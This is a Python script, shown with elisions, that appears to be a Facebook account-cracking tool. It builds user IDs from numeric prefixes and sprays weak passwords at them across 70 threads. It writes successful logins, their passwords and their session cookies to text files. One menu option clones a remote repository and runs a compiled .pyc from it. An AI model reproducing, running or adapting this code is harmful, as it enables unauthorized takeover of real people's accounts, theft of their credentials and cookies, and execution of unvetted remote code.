#---------------------[UzBek-BaCha]---------------------#
#UzBek AND BaCha IS THE BEST OF THE CRACK TOOLS SYESTUM#
...
os.system('xdg-open https://t.me/UzBek_BaCha')
print(' ')
...
logo=("""                  
 ...
 \33[1;30m█████████████████████████████████████████████████████████████████████████
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[\033[1;33m[•] AUTHOR   \33[0;m:\033[1;35m UzBek & \033[1;36mBaCha
╠══[\033[1;32m[•] FACEBOOK \033[1;32m:\033[1;32m UzBek & \033[1;33mBaCha
╠══[\033[1;32m[•] FOLLOW ME TELEGRAM 
╠══[\033[1;33m[•] MY GITHUB UzBek-BaCha
...
def barie():
    ...
    if opt == '2':
        ...
        return None
    if opt == '1':
    	os.system('rm -rf OMAR && git clone https://github.com/Uzbek-Bacha/OMAR && cd OMAR && python OMAR_DUMP.pyc')
...
def m3():
    ...
    os.system('clear')
    print(logo)
    print(' CHOOSE CODE : 9055, 9054, 9053, 9058, 9057')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
...
def b1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'turkiye','turk123','kurt123','konya123','Ahmet123','mehmet123','123456']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'turkiye','turk123','kurt123','konya123','Ahmet123','mehmet123','123456']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97mUzBek-BaCha\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[UzBek-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
                open('UzBek-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[UzBek-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('UzBek-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
